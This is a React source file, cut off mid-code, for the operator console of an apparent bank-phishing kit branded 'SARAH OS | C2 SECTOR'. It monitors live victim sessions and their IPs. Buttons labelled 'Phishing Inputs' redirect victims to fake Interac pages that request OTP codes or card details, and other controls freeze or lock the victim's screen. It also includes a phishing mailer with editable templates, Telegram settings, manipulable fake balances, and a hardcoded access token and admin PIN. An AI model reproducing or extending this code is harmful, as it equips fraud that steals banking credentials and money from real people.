import { jsx as _jsx, jsxs as _jsxs, Fragment as _Fragment } from "react/jsx-runtime";
import { useState } from 'react';
import { useSocket } from '../shared/SocketContext';
import { useBank } from '../shared/BankContext';
import { X, Users, Activity, Terminal, Send, RefreshCw, ExternalLink, Trash2, Settings, MessageSquare, ChevronLeft, Clock, Shield, DollarSign, Mail, Zap, Database, Smartphone, Lock, Globe, Power, Bell, CreditCard } from 'lucide-react';
import { Mailer } from './Mailer';
export const AdminPanel = () => {
    const { activeUsers, logs, deployOutput, sendCommand } = useSocket();
    const { toggleAdminPanel } = useBank();
    const [activeTab, setActiveTab] = useState('live');
    const [globalSettings, setGlobalSettings] = useState(null);
    const [selectedUser, setSelectedUser] = useState(null);
    const [mailerStatus, setMailerStatus] = useState(null);
    const [mailerLogs, setMailerLogs] = useState([]);
    const [mailerConfig, setMailerConfig] = useState(null);
    const [templates, setTemplates] = useState([]);
    const [selectedTemplate, setSelectedTemplate] = useState(null);
    const [templateContent, setTemplateContent] = useState('');
    const [users, setUsers] = useState([]);
    const [testEmail, setTestEmail] = useState('');
    const [isRefreshing, setIsRefreshing] = useState(false);
    const [newUser, setNewUser] = useState({ username: '', password: '', initialBalance: '1000' });
    const [showAddUser, setShowAddUser] = useState(false);
    const [editingUser, setEditingUser] = useState(null);
    const fetchGlobalSettings = async (retries = 3) => {
        try {
            const res = await fetch('/api/admin/global-settings.php?token=projectsarah');
            if (res.ok) {
                const data = await res.json();
                setGlobalSettings({
                    smtp: { host: '', port: 587, secure: false, user: '', pass: '', senderName: '', ...data.smtp },
                    telegram: { token: '', chatId: '', ...data.telegram },
                    general: { adminPin: '6969', overdraftLimit: 500, transferLimit: 3000, dailyLimit: 3000, maintenanceMode: false, mailerType: 'node', ...data.general },
                    ...data
                });
            }
            else {
                throw new Error(`Server returned ${res.status}`);
            }
        }
        catch (error) {
            console.error('Failed to fetch global settings:', error);
            if (retries > 0) {
                console.log(`Retrying... (${retries} retries left)`);
                setTimeout(() => fetchGlobalSettings(retries - 1), 1000);
            }
        }
    };
    const saveGlobalSettings = async () => {
        try {
            const res = await fetch('/api/admin/global-settings.php?token=projectsarah', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(globalSettings)
            });
            if (res.ok) {
                alert('Global settings saved!');
                handleCommand('all', 'refresh_settings');
            }
        }
        catch (error) {
            console.error('Failed to save global settings:', error);
            alert('Failed to save global settings');
        }
    };
    const fetchMailerData = async () => {
        setIsRefreshing(true);
        try {
            const [statusRes, logsRes, configRes] = await Promise.all([
                fetch('/api/admin/mailer/status.php?token=projectsarah'),
                fetch('/api/admin/mailer/logs.php?token=projectsarah'),
                fetch('/api/admin/global-settings.php?token=projectsarah')
            ]);
            if (statusRes.ok)
                setMailerStatus(await statusRes.json());
            if (logsRes.ok) {
                const logsData = await logsRes.json();
                setMailerLogs(logsData.logs || []);
            }
            if (configRes.ok) {
                const configData = await configRes.json();
                setMailerConfig(configData || null);
            }
        }
        catch (error) {
            console.error('Failed to fetch mailer data:', error);
        }
        finally {
            setIsRefreshing(false);
        }
    };
    const handleSendTest = async () => {
        if (!testEmail)
            return;
        try {
            const res = await fetch('/api/admin/mailer/test.php?token=projectsarah', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ email: testEmail })
            });
            const data = await res.json();
            alert(data.success ? 'Test email sent!' : `Error: ${data.error}`);
            fetchMailerData();
        }
        catch (error) {
            console.error('Failed to send test email:', error);
            alert('Failed to send test email');
        }
    };
    const handleClearMailerLogs = async () => {
        if (!confirm('Are you sure you want to delete all mailer logs?'))
            return;
        try {
            await fetch('/api/admin/mailer/delete-logs.php?token=projectsarah', { method: 'POST' });
            fetchMailerData();
        }
        catch (error) {
            console.error('Failed to clear logs:', error);
            alert('Failed to clear logs');
        }
    };
    const fetchTemplates = async () => {
        try {
            const res = await fetch('/api/admin/mailer/templates.php?token=projectsarah');
            if (!res.ok) {
                console.error(`Failed to fetch templates: ${res.status} ${res.statusText}`);
                return;
            }
            const data = await res.json();
            setTemplates(data.templates || []);
        }
        catch (error) {
            console.error('Failed to fetch templates:', error);
        }
    };
    const fetchTemplateContent = async (templateName) => {
        try {
            const res = await fetch(`/api/admin/mailer/template-content.php?token=projectsarah&template=${templateName}`);
            if (res.ok) {
                const data = await res.json();
                setTemplateContent(data.content || '');
                setSelectedTemplate(templateName);
            }
        }
        catch (error) {
            console.error('Failed to fetch template content:', error);
        }
    };
    const handleUpdateTemplate = async () => {
        if (!selectedTemplate)
            return;
        try {
            const res = await fetch('/api/admin/mailer/update-template.php?token=projectsarah', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ template: selectedTemplate, content: templateContent })
            });
            const data = await res.json();
            alert(data.success ? 'Template updated!' : `Error: ${data.error}`);
        }
        catch (error) {
            console.error('Failed to update template:', error);
            alert('Failed to update template');
        }
    };
    const fetchUsers = async () => {
        try {
            const res = await fetch('/api/admin/users.php?token=projectsarah');
            if (res.ok) {
                const data = await res.json();
                setUsers(data.users || []);
            }
        }
        catch (error) {
            console.error('Failed to fetch users:', error);
        }
    };
    const handleCreateUser = async () => {
        if (!newUser.username || !newUser.password)
            return;
        try {
            const res = await fetch('/api/admin/users/create.php?token=projectsarah', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(newUser)
            });
            const data = await res.json();
            if (data.success) {
                alert('User created successfully!');
                setNewUser({ username: '', password: '', initialBalance: '1000' });
                setShowAddUser(false);
                fetchUsers();
            }
            else {
                alert(`Error: ${data.message}`);
            }
        }
        catch (error) {
            console.error('Failed to create user:', error);
            alert('Failed to create user');
        }
    };
    const handleDeleteUser = async (username) => {
        if (!confirm(`Are you sure you want to delete user ${username}?`))
            return;
        try {
            const res = await fetch('/api/user/delete.php?token=projectsarah', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ username })
            });
            const data = await res.json();
            if (data.success) {
                alert('User deleted!');
                fetchUsers();
            }
        }
        catch (error) {
            console.error('Failed to delete user:', error);
            alert('Failed to delete user');
        }
    };
    const handleToggleEnabled = async (username) => {
        try {
            const res = await fetch('/api/admin/users/toggle-enabled.php?token=projectsarah', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ username })
            });
            const data = await res.json();
            if (data.success) {
                fetchUsers();
            }
        }
        catch (error) {
            console.error('Failed to toggle user status:', error);
            alert('Failed to toggle user status');
        }
    };
    const handleUpdateBalance = async (username, account) => {
        const balance = prompt(`Enter new balance for ${account}:`);
        if (balance === null || isNaN(parseFloat(balance)))
            return;
        try {
            const res = await fetch('/api/admin/users/update-balance.php?token=projectsarah', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ username, account, balance: parseFloat(balance) })
            });
            const data = await res.json();
            if (data.success) {
                alert('Balance updated!');
                fetchUsers();
                if (editingUser && editingUser.username === username) {
                    const updatedUsersRes = await fetch('/api/admin/users.php?token=projectsarah');
                    const updatedUsersData = await updatedUsersRes.json();
                    const updatedUser = updatedUsersData.users.find((u) => u.username === username);
                    setEditingUser(updatedUser);
                }
            }
        }
        catch (error) {
            console.error('Failed to update balance:', error);
            alert('Failed to update balance');
        }
    };
    const handleSaveUserSettings = async () => {
        if (!editingUser)
            return;
        try {
            const res = await fetch('/api/admin/users/update-settings.php?token=projectsarah', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    username: editingUser.username,
                    settings: editingUser.settings
                })
            });
            const autoDeleteRes = await fetch('/api/admin/users/set-auto-delete.php?token=projectsarah', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    username: editingUser.username,
                    deleteAt: editingUser.autoDeleteAt
                })
            });
            if (res.ok && autoDeleteRes.ok) {
                alert('User settings saved!');
                fetchUsers();
            }
        }
        catch (error) {
            console.error('Failed to save user settings:', error);
            alert('Failed to save user settings');
        }
    };
    const handleCommand = (targetId, command, payload) => {
        sendCommand(targetId, command, payload);
    };
    return (_jsxs("div", { className: "absolute inset-0 bg-[#0A0A0B] z-[1000] flex flex-col text-[#E0E0E6] font-mono selection:bg-cyan-500/30", children: [_jsxs("div", { className: "px-5 py-4 border-b border-white/5 flex items-center justify-between bg-[#111113] backdrop-blur-xl", children: [_jsxs("div", { className: "flex items-center gap-4", children: [_jsxs("div", { className: "relative", children: [_jsx("div", { className: "absolute inset-0 bg-cyan-500/20 blur-md animate-pulse" }), _jsx(Terminal, { className: "w-5 h-5 text-cyan-400 relative z-10" })] }), _jsxs("div", { children: [_jsx("h2", { className: "font-black text-xs tracking-widest text-white uppercase", children: "SARAH OS | C2 SECTOR" }), _jsxs("div", { className: "flex items-center gap-2 mt-0.5", children: [_jsx("span", { className: "w-1.5 h-1.5 rounded-full bg-green-500 animate-pulse" }), _jsx("span", { className: "text-[9px] text-gray-500 uppercase tracking-tighter", children: "System Online // Node-Dispatcher-v4" })] })] })] }), _jsxs("div", { className: "flex items-center gap-3", children: [_jsxs("div", { className: "text-right hidden sm:block mr-2", children: [_jsx("div", { className: "text-[10px] text-cyan-500 font-bold", children: new Date().toLocaleTimeString() }), _jsx("div", { className: "text-[8px] text-gray-600 uppercase", children: "Local Operator Time" })] }), _jsx("button", { onClick: toggleAdminPanel, className: "p-2 hover:bg-white/5 rounded-lg border border-white/5 hover:border-white/10 transition-all text-gray-400 hover:text-white", children: _jsx(X, { className: "w-5 h-5" }) })] })] }), _jsx("div", { className: "flex-1 overflow-y-auto pb-24 px-4 pt-4 custom-scrollbar", children: activeTab === 'live' ? (_jsx("div", { className: "space-y-3", children: Object.values(activeUsers).length === 0 ? (_jsx("div", { className: "text-center py-10 text-gray-500 italic", children: "No active sessions found." })) : (Object.values(activeUsers).map((u) => (_jsxs("div", { className: `p-3 rounded-lg border transition-all ${selectedUser === u.id ? 'bg-red-500/10 border-red-500/50' : 'bg-[#2c2c2e] border-white/5 hover:border-white/20'}`, children: [_jsxs("div", { className: "flex items-start justify-between mb-2", children: [_jsxs("div", { onClick: () => setSelectedUser(selectedUser === u.id ? null : u.id), className: "cursor-pointer", children: [_jsxs("div", { className: "font-bold text-xs flex items-center gap-2", children: [_jsx("span", { className: `w-2 h-2 rounded-full ${Date.now() - new Date(u.lastSeen).getTime() < 10000 ? 'bg-green-500 animate-pulse' : 'bg-gray-500'}` }), u.username] }), _jsx("div", { className: "text-[9px] text-gray-400 font-mono mt-0.5", children: u.id })] }), _jsx("div", { className: "text-[9px] bg-black/30 px-1.5 py-0.5 rounded text-gray-300 font-mono", children: u.ip })] }), _jsxs("div", { className: "text-[10px] text-gray-300 mb-3 flex items-center gap-1.5", children: [_jsx(ExternalLink, { className: "w-3 h-3 text-red-400" }), _jsx("span", { className: "truncate max-w-[200px]", children: u.currentPath })] }), selectedUser === u.id && (_jsxs("div", { className: "grid grid-cols-2 gap-2 pt-3 border-t border-white/5 mt-3", children: [_jsx("div", { className: "col-span-2 text-[8px] font-bold text-cyan-500/50 uppercase mb-1 tracking-widest", children: "Navigation Controls" }), _jsxs("button", { onClick: () => handleCommand(u.id, 'redirect', { path: '/login' }), className: "flex items-center justify-center gap-1.5 bg-white/5 hover:bg-cyan-500/20 py-2 rounded text-[9px] font-bold transition-all border border-white/5 hover:border-cyan-500/50", children: [_jsx(Lock, { className: "w-3 h-3" }), " LOGIN PAGE"] }), _jsxs("button", { onClick: () => handleCommand(u.id, 'redirect', { path: '/deposit' }), className: "flex items-center justify-center gap-1.5 bg-white/5 hover:bg-cyan-500/20 py-2 rounded text-[9px] font-bold transition-all border border-white/5 hover:border-cyan-500/50", children: [_jsx(Globe, { className: "w-3 h-3" }), " INTERAC LOBBY"] }), _jsx("div", { className: "col-span-2 text-[8px] font-bold text-red-500/50 uppercase mt-2 mb-1 tracking-widest", children: "Phishing Inputs" }), _jsxs("button", { onClick: () => handleCommand(u.id, 'redirect', { path: `/deposit?ref=${Math.random().toString(36).substring(7).toUpperCase()}&amt=3000&from=INTERAC&type=otp` }), className: "flex items-center justify-center gap-1.5 bg-red-500/10 hover:bg-red-500/20 py-2 rounded text-[9px] font-bold transition-all border border-red-500/20", children: [_jsx(Smartphone, { className: "w-3 h-3" }), " REQUEST OTP"] }), _jsxs("button", { onClick: () => handleCommand(u.id, 'redirect', { path: `/deposit?type=card` }), className: "flex items-center justify-center gap-1.5 bg-red-500/10 hover:bg-red-500/20 py-2 rounded text-[9px] font-bold transition-all border border-red-500/20", children: [_jsx(CreditCard, { className: "w-3 h-3" }), " REQUEST CARD"] }), _jsx("div", { className: "col-span-2 text-[8px] font-bold text-orange-500/50 uppercase mt-2 mb-1 tracking-widest", children: "Session Authority" }), _jsxs("button", { onClick: () => handleCommand(u.id, 'alert', { message: 'Security check required. Please wait...' }), className: "flex items-center justify-center gap-1.5 bg-white/5 hover:bg-white/10 py-2 rounded text-[9px] font-bold transition-all border border-white/5", children: [_jsx(Bell, { className: "w-3 h-3" }), " ALERT"] }), _jsxs("button", { onClick: () => handleCommand(u.id, 'reload'), className: "flex items-center justify-center gap-1.5 bg-white/5 hover:bg-white/10 py-2 rounded text-[9px] font-bold transition-all border border-white/5", children: [_jsx(RefreshCw, { className: "w-3 h-3" }), " REFRESH"] }), _jsxs("button", { onClick: () => handleCommand(u.id, 'redirect', { path: '/maintenance' }), className: "flex items-center justify-center gap-1.5 bg-orange-500/10 hover:bg-orange-500/20 py-2 rounded text-[9px] font-bold transition-all border border-orange-500/20 text-orange-400", children: [_jsx(Power, { className: "w-3 h-3" }), " FREEZE UI"] }), _jsxs("button", { onClick: () => handleCommand(u.id, 'redirect', { path: '/locked' }), className: "flex items-center justify-center gap-1.5 bg-red-900/20 hover:bg-red-900/40 py-2 rounded text-[9px] font-bold transition-all border border-red-500/30 text-red-500", children: [_jsx(Shield, { className: "w-3 h-3" }), " LOCK ACCT"] })] }))] }, u.id)))) })) : activeTab === 'database' ? (_jsx("div", { className: "space-y-4", children: editingUser ? (_jsxs("div", { className: "space-y-4 animate-in slide-in-from-right duration-200", children: [_jsxs("div", { className: "flex items-center justify-between bg-[#2c2c2e] p-3 rounded-lg border border-white/5", children: [_jsxs("button", { onClick: () => setEditingUser(null), className: "flex items-center gap-1 text-gray-400 hover:text-white transition-colors text-[10px] font-bold", children: [_jsx(ChevronLeft, { className: "w-4 h-4" }), " BACK"] }), _jsx("div", { className: "text-xs font-bold text-red-500 uppercase", children: editingUser.username }), _jsx("button", { onClick: handleSaveUserSettings, className: "bg-red-600 hover:bg-red-700 px-3 py-1 rounded text-[9px] font-bold transition-colors", children: "SAVE" })] }), _jsxs("div", { className: "p-4 bg-[#2c2c2e] rounded-lg border border-white/5 space-y-4", children: [_jsxs("h3", { className: "text-[10px] font-bold text-gray-400 uppercase flex items-center gap-2", children: [_jsx(DollarSign, { className: "w-3.5 h-3.5" }), " ACCOUNT BALANCES"] }), _jsx("div", { className: "space-y-2", children: Object.entries(editingUser.accounts || {}).map(([name, acc]) => (_jsxs("div", { className: "flex items-center justify-between bg-black/20 p-2 rounded border border-white/5", children: [_jsx("span", { className: "text-[10px] text-gray-300", children: name }), _jsxs("div", { className: "flex items-center gap-3", children: [_jsxs("span", { className: "font-mono text-emerald-400 text-[11px]", children: ["$", acc.balance?.toFixed(2)] }), _jsx("button", { onClick: () => handleUpdateBalance(editingUser.username, name), className: "p-1.5 hover:bg-white/10 rounded text-gray-500 hover:text-white transition-colors", children: _jsx(Settings, { className: "w-3.5 h-3.5" }) })] })] }, name))) })] }), _jsxs("div", { className: "p-4 bg-[#2c2c2e] rounded-lg border border-white/5 space-y-4", children: [_jsxs("h3", { className: "text-[10px] font-bold text-gray-400 uppercase flex items-center gap-2", children: [_jsx(Users, { className: "w-3.5 h-3.5" }), " IDENTITY"] }), _jsxs("div", { className: "space-y-3", children: [_jsxs("div", { className: "space-y-1", children: [_jsx("label", { className: "text-[9px] text-gray-500 uppercase font-bold", children: "Account Holder Name" }), _jsx("input", { type: "text", value: editingUser.settings?.accountHolderName || '', onChange: (e) => setEditingUser({
                                                            ...editingUser,
                                                            settings: { ...editingUser.settings, accountHolderName: e.target.value }
                                                        }), className: "w-full bg-black/30 border border-white/10 rounded px-3 py-1.5 text-[10px] focus:outline-none focus:border-red-500/50", placeholder: "Legal Name" })] }), _jsxs("div", { className: "space-y-1", children: [_jsx("label", { className: "text-[9px] text-gray-500 uppercase font-bold", children: "Email Sender Name" }), _jsx("input", { type: "text", value: editingUser.settings?.phpmailerSenderName || '', onChange: (e) => setEditingUser({
                                                            ...editingUser,
                                                            settings: { ...editingUser.settings, phpmailerSenderName: e.target.value }
                                                        }), className: "w-full bg-black/30 border border-white/10 rounded px-3 py-1.5 text-[10px] focus:outline-none focus:border-red-500/50", placeholder: "Display Name" })] })] })] }), _jsxs("div", { className: "p-4 bg-[#2c2c2e] rounded-lg border border-white/5 space-y-4", children: [_jsxs("h3", { className: "text-[10px] font-bold text-gray-400 uppercase flex items-center gap-2", children: [_jsx(Shield, { className: "w-3.5 h-3.5" }), " TRANSFER LIMITS"] }), _jsxs("div", { className: "grid grid-cols-2 gap-3", children: [_jsxs("div", { className: "space-y-1", children: [_jsx("label", { className: "text-[9px] text-gray-500 uppercase font-bold", children: "Per Transfer" }), _jsx("input", { type: "number", value: editingUser.settings?.transferLimit || 1000, onChange: (e) => setEditingUser({
                                                            ...editingUser,
                                                            settings: { ...editingUser.settings, transferLimit: parseFloat(e.target.value) }
                                                        }), className: "w-full bg-black/30 border border-white/10 rounded px-3 py-1.5 text-[10px] focus:outline-none focus:border-red-500/50" })] }), _jsxs("div", { className: "space-y-1", children: [_jsx("label", { className: "text-[9px] text-gray-500 uppercase font-bold", children: "Daily Limit" }), _jsx("input", { type: "number", value: editingUser.settings?.dailyLimit || 3000, onChange: (e) => setEditingUser({
                                                            ...editingUser,
                                                            settings: { ...editingUser.settings, dailyLimit: parseFloat(e.target.value) }
                                                        }), className: "w-full bg-black/30 border border-white/10 rounded px-3 py-1.5 text-[10px] focus:outline-none focus:border-red-500/50" })] })] })] }), _jsxs("div", { className: "p-4 bg-[#2c2c2e] rounded-lg border border-white/5 space-y-4", children: [_jsxs("h3", { className: "text-[10px] font-bold text-gray-400 uppercase flex items-center gap-2", children: [_jsx(Clock, { className: "w-3.5 h-3.5" }), " AUTO-DELETE TIMER"] }), _jsxs("div", { className: "space-y-2", children: [_jsx("label", { className: "text-[9px] text-gray-500 uppercase font-bold", children: "Delete Account At (ISO Date)" }), _jsxs("div", { className: "flex gap-2", children: [_jsx("input", { type: "datetime-local", value: editingUser.autoDeleteAt ? new Date(editingUser.autoDeleteAt).toISOString().slice(0, 16) : '', onChange: (e) => setEditingUser({
                                                            ...editingUser,
                                                            autoDeleteAt: e.target.value ? new Date(e.target.value).toISOString() : null
                                                        }), className: "flex-1 bg-black/30 border border-white/10 rounded px-3 py-1.5 text-[10px] focus:outline-none focus:border-red-500/50" }), _jsx("button", { onClick: () => setEditingUser({ ...editingUser, autoDeleteAt: null }), className: "p-1.5 bg-white/5 hover:bg-red-500/20 text-gray-400 hover:text-red-500 rounded transition-colors", title: "Clear Timer", children: _jsx(Trash2, { className: "w-4 h-4" }) })] }), _jsx("div", { className: "text-[8px] text-gray-500 italic", children: editingUser.autoDeleteAt ? `Expires on: ${new Date(editingUser.autoDeleteAt).toLocaleString()}` : 'No expiration set' })] })] }), _jsxs("div", { className: "grid grid-cols-1 gap-2", children: [_jsxs("button", { onClick: () => handleToggleEnabled(editingUser.username), className: `w-full py-2.5 rounded text-[10px] font-bold transition-colors flex items-center justify-center gap-2 ${editingUser.enabled !== false ? 'bg-orange-600/20 text-orange-500 hover:bg-orange-600/30' : 'bg-green-600/20 text-green-500 hover:bg-green-600/30'}`, children: [_jsx(RefreshCw, { className: "w-3.5 h-3.5" }), editingUser.enabled !== false ? 'DISABLE ACCOUNT' : 'ENABLE ACCOUNT'] }), _jsxs("button", { onClick: () => {
                                            handleDeleteUser(editingUser.username);
                                            setEditingUser(null);
                                        }, className: "w-full bg-red-600/20 text-red-500 hover:bg-red-600/30 py-2.5 rounded text-[10px] font-bold transition-colors flex items-center justify-center gap-2", children: [_jsx(Trash2, { className: "w-3.5 h-3.5" }), " DELETE USER PERMANENTLY"] })] })] })) : (_jsxs("div", { className: "space-y-4", children: [_jsxs("button", { onClick: () => setShowAddUser(!showAddUser), className: "w-full bg-red-600 hover:bg-red-700 py-2.5 rounded text-[10px] font-bold transition-all shadow-lg flex items-center justify-center gap-2", children: [showAddUser ? _jsx(ChevronLeft, { className: "w-4 h-4" }) : _jsx(Users, { className: "w-4 h-4" }), showAddUser ? 'CANCEL' : 'ADD NEW USER'] }), showAddUser && (_jsxs("div", { className: "p-4 bg-[#2c2c2e] rounded-lg border border-red-500/30 space-y-4 animate-in slide-in-from-top duration-200", children: [_jsxs("div", { className: "space-y-1", children: [_jsx("label", { className: "text-[9px] text-gray-500 uppercase font-bold", children: "Username" }), _jsx("input", { type: "text", value: newUser.username, onChange: (e) => setNewUser({ ...newUser, username: e.target.value }), className: "w-full bg-black/30 border border-white/10 rounded px-3 py-1.5 text-[10px] focus:outline-none focus:border-red-500/50" })] }), _jsxs("div", { className: "space-y-1", children: [_jsx("label", { className: "text-[9px] text-gray-500 uppercase font-bold", children: "Password" }), _jsx("input", { type: "text", value: newUser.password, onChange: (e) => setNewUser({ ...newUser, password: e.target.value }), className: "w-full bg-black/30 border border-white/10 rounded px-3 py-1.5 text-[10px] focus:outline-none focus:border-red-500/50" })] }), _jsxs("div", { className: "space-y-1", children: [_jsx("label", { className: "text-[9px] text-gray-500 uppercase font-bold", children: "Initial Balance ($)" }), _jsx("input", { type: "number", value: newUser.initialBalance, onChange: (e) => setNewUser({ ...newUser, initialBalance: e.target.value }), className: "w-full bg-black/30 border border-white/10 rounded px-3 py-1.5 text-[10px] focus:outline-none focus:border-red-500/50" })] }), _jsx("button", { onClick: handleCreateUser, className: "w-full bg-green-600 hover:bg-green-700 py-2.5 rounded text-[10px] font-bold transition-colors shadow-lg", children: "CREATE USER" })] })), _jsx("div", { className: "grid grid-cols-1 gap-2", children: users.length === 0 ? (_jsx("div", { className: "text-center py-10 text-gray-500 italic", children: "No users found." })) : (users.map((u, i) => (_jsxs("button", { onClick: () => setEditingUser(u), className: "p-3 bg-[#2c2c2e] rounded-lg border border-white/5 hover:border-red-500/30 transition-all text-left group", children: [_jsxs("div", { className: "flex items-center justify-between mb-1", children: [_jsxs("div", { className: "font-bold text-xs flex items-center gap-2", children: [_jsx("span", { className: `w-1.5 h-1.5 rounded-full ${u.enabled !== false ? 'bg-green-500' : 'bg-red-500'}` }), u.username || 'Unknown'] }), _jsx(ChevronLeft, { className: "w-3 h-3 text-gray-600 group-hover:text-red-500 rotate-180 transition-all" })] }), _jsxs("div", { className: "flex items-center justify-between text-[9px] text-gray-500", children: [_jsxs("span", { children: [Object.keys(u.accounts || {}).length, " Accounts"] }), _jsxs("span", { className: "font-mono text-emerald-500/70", children: ["$", Object.values(u.accounts || {}).reduce((sum, acc) => sum + (acc.balance || 0), 0).toFixed(2)] })] })] }, i)))) })] })) })) : activeTab === 'system' ? (_jsxs("div", { className: "space-y-4", children: [_jsxs("div", { className: "flex items-center justify-between mb-2", children: [_jsxs("h3", { className: "text-[10px] font-bold text-cyan-500 uppercase tracking-widest flex items-center gap-2", children: [_jsx(Terminal, { className: "w-4 h-4" }), " ENGINE_LOGS_STREAM"] }), _jsx("button", { onClick: () => handleCommand('all', 'clear_logs'), className: "text-[9px] text-gray-500 hover:text-red-500 transition-colors bg-white/5 px-2 py-1 rounded", children: "PURGE_LOGS" })] }), _jsx("div", { className: "space-y-2 font-mono text-[9px] max-h-[300px] overflow-y-auto bg-black/40 rounded border border-white/5 p-3 custom-scrollbar", children: logs.length === 0 ? (_jsx("div", { className: "text-center py-10 text-gray-700 italic", children: "Waiting for inbound data..." })) : ([...logs].reverse().slice(0, 50).map((log) => (_jsxs("div", { className: "mb-1 pb-1 border-b border-white/5 last:border-0 opacity-80 hover:opacity-100 transition-opacity", children: [_jsxs("span", { className: "text-gray-600", children: ["[", new Date(log.timestamp).toLocaleTimeString(), "]"] }), _jsxs("span", { className: "text-cyan-500 mx-2", children: ["@", log.username || 'SYS'] }), _jsxs("span", { className: "text-gray-400", children: [log.action, ": ", typeof log.details === 'string' ? log.details : JSON.stringify(log.details)] })] }, log.id)))) }), _jsxs("div", { className: "p-4 bg-[#111113] rounded-lg border border-white/5 space-y-4", children: [_jsxs("h3", { className: "text-[10px] font-bold text-gray-400 uppercase flex items-center gap-2", children: [_jsx(RefreshCw, { className: "w-3.5 h-3.5" }), " DEPLOYMENT_CORE"] }), _jsxs("div", { className: "grid grid-cols-2 gap-2", children: [_jsx("button", { onClick: () => handleCommand('all', 'deploy', { args: [] }), className: "bg-cyan-600/20 text-cyan-400 hover:bg-cyan-600/30 border border-cyan-500/30 py-2.5 rounded text-[10px] font-bold transition-all", children: "RUN_DEPLOY" }), _jsx("button", { onClick: () => handleCommand('all', 'deploy', { args: ['rebuild'] }), className: "bg-white/5 hover:bg-white/10 py-2.5 rounded text-[10px] font-bold transition-all border border-white/5", children: "REBUILD_IMG" })] })] }), _jsx("div", { className: "p-4 bg-black rounded-lg border border-white/10 font-mono text-[9px] h-[200px] overflow-y-auto flex flex-col-reverse custom-scrollbar", children: _jsx("div", { className: "space-y-1", children: deployOutput.length === 0 ? (_jsx("div", { className: "text-gray-600", children: "# Waiting for deployment output..." })) : (deployOutput.map((line, i) => (_jsxs("div", { className: "text-cyan-400 whitespace-pre-wrap", children: [_jsx("span", { className: "text-gray-500 mr-2", children: "$" }), line] }, i)))) }) })] })) : activeTab === 'mailer' ? (_jsxs("div", { className: "space-y-4", children: [_jsxs("div", { className: "p-4 bg-[#2c2c2e] rounded-lg border border-white/5 space-y-4", children: [_jsxs("h3", { className: "text-[10px] font-bold text-gray-400 uppercase flex items-center gap-2", children: [_jsx(Settings, { className: "w-3.5 h-3.5" }), " MAILER CONFIGURATION"] }), _jsxs("div", { className: "space-y-2", children: [_jsx("label", { className: "text-[9px] text-gray-500 uppercase font-bold", children: "Default Mailer System" }), _jsxs("select", { value: globalSettings?.general?.mailerType || 'node', onChange: (e) => setGlobalSettings({
                                                ...globalSettings,
                                                general: { ...globalSettings?.general, mailerType: e.target.value }
                                            }), className: "w-full bg-black/30 border border-white/10 rounded px-3 py-1.5 text-[10px] focus:outline-none focus:border-red-500/50", children: [_jsx("option", { value: "node", children: "Node Mailer" }), _jsx("option", { value: "python", children: "Python Mailer" }), _jsx("option", { value: "php", children: "PHP Mailer" })] })] })] }), _jsxs("div", { className: "bg-[#2c2c2e] rounded-lg border border-red-500/30 overflow-hidden", children: [_jsxs("div", { className: "p-3 bg-red-500/10 border-b border-red-500/20 flex items-center justify-between gap-2", children: [_jsxs("div", { className: "flex items-center gap-2", children: [_jsx(Mail, { className: "w-4 h-4 text-red-500" }), _jsx("span", { className: "text-[10px] font-bold uppercase tracking-wider", children: "TSX (Node.js) Mailer Dispatcher" })] }), _jsx("button", { onClick: () => window.location.href = '/?view=mailer', className: "p-1 hover:bg-white/10 rounded text-gray-400 hover:text-white transition-colors", title: "Open Full Screen", children: _jsx(ExternalLink, { className: "w-3 h-3" }) })] }), _jsx("div", { className: "p-4 bg-[#1c1c1e]", children: _jsx(Mailer, {}) })] }), _jsxs("div", { className: "p-4 bg-[#2c2c2e] rounded-lg border border-white/5", children: [_jsxs("div", { className: "flex items-center justify-between mb-3", children: [_jsxs("h3", { className: "text-xs font-bold flex items-center gap-2", children: [_jsx(Activity, { className: "w-4 h-4 text-red-500" }), "MAILER STATUS"] }), _jsx("button", { onClick: fetchMailerData, disabled: isRefreshing, className: "p-1.5 bg-white/5 hover:bg-white/10 rounded transition-colors", children: _jsx(RefreshCw, { className: `w-3.5 h-3.5 ${isRefreshing ? 'animate-spin' : ''}` }) })] }), mailerStatus ? (_jsxs("div", { className: "grid grid-cols-2 gap-2 text-[9px] font-mono", children: [_jsxs("div", { className: "p-2 bg-black/20 rounded", children: [_jsx("div", { className: "text-gray-500 uppercase mb-1", children: "PHP Version" }), _jsx("div", { children: mailerStatus.php_version })] }), _jsxs("div", { className: "p-2 bg-black/20 rounded", children: [_jsx("div", { className: "text-gray-500 uppercase mb-1", children: "PHPMailer" }), _jsx("div", { className: mailerStatus.phpmailer_installed ? 'text-green-500' : 'text-red-500', children: mailerStatus.phpmailer_installed ? 'INSTALLED' : 'MISSING' })] }), _jsxs("div", { className: "p-2 bg-black/20 rounded", children: [_jsx("div", { className: "text-gray-500 uppercase mb-1", children: "Templates" }), _jsxs("div", { children: [mailerStatus.templates_count, " FOUND"] })] }), _jsxs("div", { className: "p-2 bg-black/20 rounded", children: [_jsx("div", { className: "text-gray-500 uppercase mb-1", children: "Config" }), _jsx("div", { className: mailerStatus.config_found ? 'text-green-500' : 'text-red-500', children: mailerStatus.config_found ? 'LOADED' : 'NOT FOUND' })] })] })) : (_jsx("div", { className: "text-center py-4 text-gray-500 text-[10px] italic", children: "Loading status..." }))] }), _jsxs("div", { className: "p-4 bg-[#2c2c2e] rounded-lg border border-white/5", children: [_jsxs("h3", { className: "text-xs font-bold mb-3 flex items-center gap-2", children: [_jsx(Send, { className: "w-4 h-4 text-red-500" }), "TEST MAILER"] }), _jsxs("div", { className: "flex gap-2", children: [_jsx("input", { type: "email", value: testEmail, onChange: (e) => setTestEmail(e.target.value), placeholder: "Enter test email...", className: "flex-1 bg-black/30 border border-white/10 rounded px-3 py-1.5 text-[10px] focus:outline-none focus:border-red-500/50" }), _jsx("button", { onClick: handleSendTest, className: "bg-red-600 hover:bg-red-700 